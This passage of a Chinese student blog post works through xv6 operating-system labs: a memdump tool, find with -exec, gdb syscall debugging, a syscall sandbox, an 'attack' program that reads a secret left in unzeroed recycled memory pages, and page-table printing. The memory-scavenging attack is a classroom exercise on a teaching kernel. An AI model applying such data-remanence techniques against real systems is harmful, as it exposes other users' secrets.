class="string">&quot;Example 1:\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span> a[<span class="number">2</span>] = &#123; <span class="number">61810</span>, <span class="number">2025</span> &#125;;</span><br><span class="line">    memdump(<span class="string">&quot;ii&quot;</span>, (<span class="type">char</span>*) a);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Example 2:\n&quot;</span>);</span><br><span class="line">    memdump(<span class="string">&quot;S&quot;</span>, <span class="string">&quot;a string&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Example 3:\n&quot;</span>);</span><br><span class="line">    <span class="type">char</span> *s = <span class="string">&quot;another&quot;</span>;</span><br><span class="line">    memdump(<span class="string">&quot;s&quot;</span>, (<span class="type">char</span> *) &amp;s);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sss</span> &#123;</span></span><br><span class="line">      <span class="type">char</span> *ptr;</span><br><span class="line">      <span class="type">int</span> num1;</span><br><span class="line">      <span class="type">short</span> num2;</span><br><span class="line">      <span class="type">char</span> byte;</span><br><span class="line">      <span class="type">char</span> bytes[<span class="number">8</span>];</span><br><span class="line">    &#125; example;</span><br><span class="line">    </span><br><span class="line">    example.ptr = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    example.num1 = <span class="number">1819438967</span>;</span><br><span class="line">    example.num2 = <span class="number">100</span>;</span><br><span class="line">    example.byte = <span class="string">&#x27;z&#x27;</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(example.bytes, <span class="string">&quot;xyzzy&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Example 4:\n&quot;</span>);</span><br><span class="line">    memdump(<span class="string">&quot;pihcS&quot;</span>, (<span class="type">char</span>*) &amp;example);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Example 5:\n&quot;</span>);</span><br><span class="line">    memdump(<span class="string">&quot;sccccc&quot;</span>, (<span class="type">char</span>*) &amp;example);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(argc == <span class="number">2</span>)&#123;</span><br><span class="line">    <span class="comment">// format in argv[1], up to 512 bytes of data from standard input.</span></span><br><span class="line">    <span class="type">char</span> data[<span class="number">512</span>];</span><br><span class="line">    <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(data, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(data));</span><br><span class="line">    <span class="keyword">while</span>(n &lt; <span class="keyword">sizeof</span>(data))&#123;</span><br><span class="line">      <span class="type">int</span> nn = read(<span class="number">0</span>, data + n, <span class="keyword">sizeof</span>(data) - n);</span><br><span class="line">      <span class="keyword">if</span>(nn &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      n += nn;</span><br><span class="line">    &#125;</span><br><span class="line">    memdump(argv[<span class="number">1</span>], data);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Usage: memdump [format]\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">memdump</span><span class="params">(<span class="type">char</span> *fmt, <span class="type">char</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// Your code here.</span></span><br><span class="line">  <span class="type">char</span> *ptr=data;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;fmt[i]!=<span class="string">&#x27;\0&#x27;</span>;i++)&#123;</span><br><span class="line">    <span class="keyword">switch</span>(fmt[i])&#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;i&#x27;</span>: &#123;</span><br><span class="line">        <span class="comment">//接下来的 4 个字节的数据以十进制 32 位整数的格式打印出来</span></span><br><span class="line">        <span class="type">int</span> *int_ptr=(<span class="type">int</span>*)ptr;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,*int_ptr);</span><br><span class="line">        ptr+=<span class="number">4</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>: &#123;</span><br><span class="line">        <span class="comment">//接下来的 8 个字节的数据以十六进制形式打印为 64 位整数</span></span><br><span class="line">        <span class="type">long</span> *long_ptr=(<span class="type">long</span>*)ptr;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%lx\n&quot;</span>,*long_ptr);</span><br><span class="line">        ptr+=<span class="number">8</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>: &#123;</span><br><span class="line">        <span class="comment">// 将数据中的下一个 2 个字节以十进制形式的 16 位整数打印出来</span></span><br><span class="line">        <span class="type">short</span> *short_ptr=(<span class="type">short</span>*)ptr;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,*short_ptr);</span><br><span class="line">        ptr+=<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;c&#x27;</span>: &#123;</span><br><span class="line">        <span class="comment">//将数据中的下一个 1 个字节以 8 位 ASCII 字符形式打印出来</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c\n&quot;</span>,*ptr);</span><br><span class="line">        ptr+=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>: &#123;</span><br><span class="line">        <span class="comment">//数据中的接下来的 8 个字节包含一个指向 C 字符串的 64 位指针；打印该字符串</span></span><br><span class="line">        <span class="type">char</span> **str_ptr=(<span class="type">char</span>**)ptr;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,*str_ptr);</span><br><span class="line">        ptr+=<span class="number">8</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>: &#123;</span><br><span class="line">        <span class="comment">//数据的剩余部分包含一个空终止的 C 字符串的字节；打印该字符串</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,ptr);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="4-find"><a href="#4-find" class="headerlink" title="4.find"></a>4.find</h2><ol><li>打开与获取文件类型</li></ol><ul><li><p>用 open(path, O_RDONLY) 打开路径，失败就报错返回。</p></li><li><p>用 fstat(fd, &amp;st) 获取该路径对应的 struct stat，以判断类型（文件&#x2F;设备&#x2F;目录）。</p></li></ul><ol start="2"><li>处理“文件&#x2F;设备”节点：只比较最后一段名字</li></ol><ul><li><p>如果是 T_FILE 或 T_DEVICE，取出 path 的最后一段名字（从末尾往前找到最后一个 &#x2F; 后的子串）。</p></li><li><p>若该名字与 target 相等，打印整条 path。</p></li></ul><ol start="3"><li>处理目录：遍历目录项并递归</li></ol><ul><li><p>先检查拼接子路径是否会超过临时缓冲区 char buf[512] 的容量：strlen(path) + 1 + DIRSIZ + 1。</p></li><li><p>将 path 复制到 buf，在末尾加上 ‘&#x2F;‘，指针 p 指向可写入子名的位置。</p></li><li><p>通过 read(fd, &amp;de, sizeof(de)) 逐条读取目录项 struct dirent de：</p></li><li><p>跳过 de.inum &#x3D;&#x3D; 0 的空项。</p></li><li><p>用 memmove(p, de.name, DIRSIZ); p[DIRSIZ]&#x3D;0; 把该目录项的名字接到 buf 后，形成形如 buf &#x3D; “<parent>&#x2F;<entry>“ 的完整路径。</entry></parent></p></li><li><p>跳过名字为 “.” 和 “..”（避免无限递归）。</p></li><li><p>调用 stat(buf, &amp;st) 获取该子路径的类型：</p></li><li><p>若是目录，递归调用 find(buf, target)。</p></li><li><p>若是文件&#x2F;设备，直接比较当前名字 p 是否等于 target，相等则打印 buf。</p></li></ul><ol start="4"><li>边界和健壮性</li></ol><ul><li><p>路径过长时打印 “find: path too long”。</p></li><li><p>open&#x2F;fstat&#x2F;stat 失败时打印错误并跳过。</p></li><li><p>每个 open 最后都 close(fd)，避免资源泄露。</p><p>为什么要跳过 “.” 和 “..”,“.” 指向当前目录，“..” 指向父目录；如果递归进入它们会导致死循环（在当前目录与父目录之间来回）。</p></li></ul><h2 id="5-exec"><a href="#5-exec" class="headerlink" title="5.exec"></a>5.exec</h2><p>find.c添加：</p><ul><li>参数组装：</li><li>将 -exec 后的命令及其参数复制到 argv。</li><li>把“匹配到的完整文件路径”作为最后一个参数自动追加到 argv，并以 0 结尾。</li><li>有 MAXARG 限制，若命令参数太多会报错并跳过执行。</li><li>执行模型：</li><li>fork() 子进程，子进程 exec(argv[0], argv) 运行命令。</li><li>父进程 wait(0) 等待，故对每个匹配都是顺序、同步执行（不并行）。</li><li>失败处理：</li><li>fork 失败打印错误并返回。</li><li>exec 失败在子进程内打印错误并 exit(1)。</li></ul><p>可选：</p><p>添加uptime系统调用</p><p>创建user&#x2F;uptime.c</p><p>测试结果</p><p><img src="/2025/09/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%AE%9E%E8%B7%B5/image-20250911083446998.png" alt="image-20250911083446998"></p><h1 id="Lab2-System-call"><a href="#Lab2-System-call" class="headerlink" title="Lab2:System call"></a>Lab2:System call</h1><h2 id="1-gdb调试"><a href="#1-gdb调试" class="headerlink" title="1.gdb调试"></a>1.gdb调试</h2><p>一个终端：make qemu-gdb</p><p>另一个终端：gdb-multiarch -nx kernel&#x2F;kernel</p><p>target remote localhost:26000</p><p>b syscall</p><p>c</p><p>layout src</p><p>backtrace</p><p><img src="/2025/09/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%AE%9E%E8%B7%B5/image-20250911230708929.png" alt="image-20250911230708929"></p><p>执行完struct proc *p &#x3D; myproc();</p><p><img src="/2025/09/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%AE%9E%E8%B7%B5/image-20250911231739514.png" alt="image-20250911231739514"></p><p>这个结构体是 xv6 中的 进程控制块（PCB），对应 <code>kernel/proc.h</code> 里的 <code>struct proc</code></p><p>p-&gt;trapframe-&gt;a7的值是 用户态代码在 <code>ecall</code> 前放到 a7 的系统调用号 user&#x2F;init.asm</p><p>易知若trap是来自用户模式则sstatus中的SPP位为0，若trap来自监管者模式则sstatus中的SPP位为1。</p><p>此时的sstatus为22其2进制表示为000101100001 011000010110，第8位SSP位为0，故CPU以前的模式是用户模式。</p><p>在 <code>syscall</code> 的开头将语句 <code>num = p-&gt;trapframe-&gt;a7;</code> 替换为 <code>num = * (int *) 0;</code> ，运行 make qemu</p><p>出现内核崩溃</p><p><img src="/2025/09/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%AE%9E%E8%B7%B5/image-20250912001414899.png" alt="image-20250912001414899"></p><p>找到kernel&#x2F;kernel.S中spec对应的汇编指令</p><p><img src="/2025/09/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%AE%9E%E8%B7%B5/image-20250912001914257.png" alt="image-20250912001914257"></p><p>num代表系统调用号，因此变量 <code>num</code> 对应a7寄存器</p><p><img src="/2025/09/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%AE%9E%E8%B7%B5/image-20250912003035039.png" alt="image-20250912003035039"></p><p>确定了导致内核崩溃的汇编指令，num &#x3D; * (int *) 0，一旦执行这条指令，CPU 就尝试访问虚拟地址 0，结果触发page fault→ 内核崩溃</p><p><img src="/2025/09/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%AE%9E%E8%B7%B5/image-20250912003649267.png" alt="image-20250912003649267"></p><h2 id="2-沙盒"><a href="#2-沙盒" class="headerlink" title="2.沙盒"></a>2.沙盒</h2><p>在 syscall.h 中添加 SYS_interpose 定义，在 proc.h 中添加沙盒掩码字段，在 syscall.c 中注册 interpose 系统调用，修改系统调用分发逻辑，添加沙盒检查，在sysproc.c实现 sys_interpose 函数,在 defs.h 中添加 sys_interpose 的声明,proc.c的在 kfork 函数中添加沙盒掩码的继承，在 allocproc 中初始化沙盒掩码，在usys.pl添加用户态接口，在user.h添加函数声明</p><p>在 RISC-V 架构里，寄存器的 ABI 约定是：</p><ul><li>a0 ~ a7 → 用作 函数参数寄存器</li><li>a0, a1 → 还用来保存 函数返回值（如果返回值超过 1 个寄存器，就用 a0 + a1 传）</li></ul><p>在 xv6 的系统调用处理中：</p><ol><li><p>用户态进程发起系统调用时，调用号放在 a7 里，参数放在 a0 ~ a5。</p><ul><li>这是和 RISC-V 的 syscall 约定一致的。</li><li>比如 <code>write(fd, buf, n)</code>，<code>a0=fd</code>，<code>a1=buf</code>，<code>a2=n</code>。</li></ul></li><li><p>进入内核 trap 后，内核在 <code>syscall()</code> 里通过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num = p-&gt;trapframe-&gt;a7;</span><br></pre></td></tr></table></figure><p>拿到系统调用号。</p></li><li><p>内核调用对应的 <code>syscalls[num]()</code> 函数。</p><ul><li>这些函数会返回一个 <code>int</code> 或 <code>uint64</code>，作为系统调用的返回值。</li></ul></li><li><p>返回值被写回到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;trapframe-&gt;a0 = syscalls[num]();</span><br></pre></td></tr></table></figure><p>也就是说：a0 用来保存系统调用的返回，在返回用户态时，用户进程能在 a0 中读到。</p><p><img src="/2025/09/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%AE%9E%E8%B7%B5/image-20250912111946972.png" alt="image-20250912111946972"></p></li></ol><h2 id="3-添加path参数"><a href="#3-添加path参数" class="headerlink" title="3.添加path参数"></a>3.添加path参数</h2><p>进程结构体扩展</p><p>在 kernel&#x2F;proc.h 中添加了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char allowed_path[MAXPATH]; // Allowed path for open/exec system calls</span><br></pre></td></tr></table></figure><p>系统调用实现更新</p><p>修改了 kernel&#x2F;sysproc.c 中的 sys_interpose() 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">uint64</span><br><span class="line"></span><br><span class="line"><span class="title function_">sys_interpose</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"> <span class="type">int</span> mask;</span><br><span class="line"></span><br><span class="line"> <span class="type">char</span> path[MAXPATH];</span><br><span class="line"></span><br><span class="line"> argint(<span class="number">0</span>, &amp;mask);</span><br><span class="line"></span><br><span class="line"> argstr(<span class="number">1</span>, path, <span class="keyword">sizeof</span>(path));</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> *<span class="comment">// Set the sandbox mask and allowed path*</span></span><br><span class="line"></span><br><span class="line"> myproc()-&gt;sandbox_mask = mask;</span><br><span class="line"></span><br><span class="line"> safestrcpy(myproc()-&gt;allowed_path, path, MAXPATH);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>路径检查函数</p><p>在 kernel&#x2F;syscall.c 中添加了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">*<span class="comment">// Check if a path is allowed for sandboxed open/e**xec calls*</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">is_path_allowed</span><span class="params">(<span class="type">char</span> **path*)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> *<span class="comment">// If no allowed path is set, deny access*</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>(p-&gt;allowed_path[<span class="number">0</span>] == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"> *<span class="comment">// Check if the path matches the allowed path*</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> <span class="built_in">strncmp</span>(path, p-&gt;allowed_path,MAXPATH) == <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>系统调用分发逻辑更新</p><p>修改了 syscall() 函数，为 open 和 exec 系统调用添加了特殊的路径检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">*<span class="comment">// Check if this system call is blocked by sandbox*</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(p-&gt;sandbox_mask &amp; (<span class="number">1</span> &lt;&lt; num)) &#123;</span><br><span class="line"></span><br><span class="line"> *<span class="comment">// Special handling for open and exec system calls*</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>(num == SYS_open || num == SYS_exec) &#123;</span><br><span class="line"></span><br><span class="line">  *<span class="comment">// Get the path argument without consuming it*</span></span><br><span class="line"></span><br><span class="line">  uint64 path_addr = p-&gt;trapframe-&gt;a0;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> path[MAXPATH];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(copyinstr(p-&gt;pagetable, path, path_addr, MAXPATH) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(is_path_allowed(path)) &#123;</span><br><span class="line"></span><br><span class="line">    *<span class="comment">// Path is allowed, proceed with the system call*</span></span><br><span class="line"></span><br><span class="line">    p-&gt;trapframe-&gt;a0 = syscalls[num]();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> *<span class="comment">// System call is blocked*</span></span><br><span class="line"></span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%d %s: sandboxed sys call %d\n&quot;</span>,</span><br><span class="line"></span><br><span class="line">     p-&gt;pid, p-&gt;name, num);</span><br><span class="line"></span><br><span class="line"> p-&gt;trapframe-&gt;a0 = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 继承机制</p><ul><li><p>在 allocproc() 中初始化 p-&gt;allowed_path[0] &#x3D; ‘\0’</p></li><li><p>在 kfork() 中添加 safestrcpy(np-&gt;allowed_path, p-&gt;allowed_path, MAXPATH); 确保子进程继承父进程的允许路径</p></li></ul><p><img src="/2025/09/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%AE%9E%E8%B7%B5/image-20250912120358925.png" alt="image-20250912120358925"></p><h2 id="4-attack"><a href="#4-attack" class="headerlink" title="4.attack"></a>4.attack</h2><p>通过 <code>sbrk</code> 分配一大段虚拟地址空间，然后在这块内存里搜索 <code>secret</code> 程序留下的标记 <code>&quot;This may help.&quot;</code>，一旦找到就把标记后面 16 字节处的字符串当作“秘密”打印出来。它依赖于内核回收&#x2F;重用物理页时<strong>不清零</strong>旧数据的行为，从而窃取别的进程曾经写入的敏感内容</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/fcntl.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/riscv.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGESIZE 4096</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNK_BYTES (8*PAGESIZE)</span></span><br><span class="line"><span class="type">char</span> find_data[CHUNK_BYTES];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;CHUNK_BYTES<span class="number">-16</span>;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(find_data+i,<span class="string">&quot;This may help.&quot;</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,find_data+i+<span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//printf(&quot;attack: secret not found\n&quot;);</span></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2025/09/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%AE%9E%E8%B7%B5/image-20250913153246034.png" alt="image-20250913153246034"></p><h1 id="Lab3-page-tables"><a href="#Lab3-page-tables" class="headerlink" title="Lab3:page tables"></a>Lab3:page tables</h1><h2 id="1-解释用户进程的页表"><a href="#1-解释用户进程的页表" class="headerlink" title="1.解释用户进程的页表"></a>1.解释用户进程的页表</h2><p><img src="/2025/09/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%AE%9E%E8%B7%B5/image-20250913224020943.png" alt="image-20250913224020943"></p><p>每一个页表项包含：va是用户态的虚拟地址，pte是页表项的原始64位值，包含物理页号+权限位，pa是计算得到的物理页基址，perm是权限位，<br>0x001 &#x3D; V<br>0x002 &#x3D; R<br>0x004 &#x3D; W<br>0x008 &#x3D; X<br>0x010 &#x3D; U<br>0x020 &#x3D; G<br>0x040 &#x3D; A<br>0x080 &#x3D; D<br>所以 0x5B &#x3D; V|R|W|U|A|D。<br>有些pte&#x3D;0表示还没分配实际内存页<br>前 10 页 (0x0 到 0x9000)<br>0x0：通常是代码段或起始的用户内存。<br>0x1000：用户栈或数据段的一部分。<br>有些是空洞 (pte&#x3D;0)，表示还没分配实际物理页。<br>后 10 页（接近 MAXVA 的高地址）<br>0xFFFFE000 和 0xFFFFF000 有映射，说明 xv6 把一些用户库函数（比如 ugetpid 的实现）放在高地址。<br>0xFFFFF000 指向物理 0x80006000，这是内核预留的一段共享页，用来提供用户可直接访问的只读数据（例如内核维护的 PID）。</p><p>在 USYSCALL 处建立一个只读共享页，用户进程可以在不陷入内核的情况下直接读取某些信息，从而 避免一次 trap&#x2F;return，大大减少开销。<br>进程信息<br>pid（已经实现）<br>ppid（父进程 ID）<br>uid &#x2F; gid（如果 xv6 扩展用户概念）<br>exit status（只读缓存，可能需要机制保证同步）<br>时间相关<br>当前 tick 数（内核全局时钟中断累计值）<br>uptime（系统启动到现在的时间）<br>（可选）高精度时钟值（如果要优化 gettimeofday() 这种调用）<br>内核信息<br>nproc（当前进程数，用于教学&#x2F;实验）<br>loadavg（平均负载，简单版本）<br>调度相关<br>当前 cpu id（对应 cpuid()）<br>当前进程的调度优先级&#x2F;权重</p><h2 id="2-加快系统调用"><a href="#2-加快系统调用" class="headerlink" title="2.加快系统调用"></a>2.加快系统调用</h2><p>用户空间的 ugetpid 函数已经实现，它直接从 USYSCALL 地址读取 PID。</p><p>修改 proc 结构体，添加 usyscall 字段</p><p>修改这些函数来支持 USYSCALL 映射。首先修改 proc_pagetable 函数和proc_freepagetable函数</p><p>修改 allocproc 函数来分配和初始化 usyscall 页面</p><p>修改 freeproc 函数来释放 usyscall 页面</p><p>需要初始化 usyscall 结构体，存储当前进程的 PID。需要在 allocproc 函数中，在分配 usyscall 页面之后添加初始化代码</p><p>找到了 kfork 函数，这是实际的 fork 实现，在复制 trapframe 之后添加 usyscall 的复制</p><h2 id="3-打印页表"><a href="#3-打印页表" class="headerlink" title="3.打印页表"></a>3.打印页表</h2><p><img src="/2025/09/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%AE%9E%E8%B7%B5/image-20250914163323108.png" alt="image-20250914163323108"></p><p>kernel&#x2F;vm.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> defined(LAB_PGTBL) || defined(SOL_MMAP) || defined(SOL_COW)</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">vmprint_recursive</span><span class="params">(<span class="type">pagetable_t</span> pagetable, <span class="type">int</span> level, uint64 base_va)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">vmprint</span><span class="params">(<span 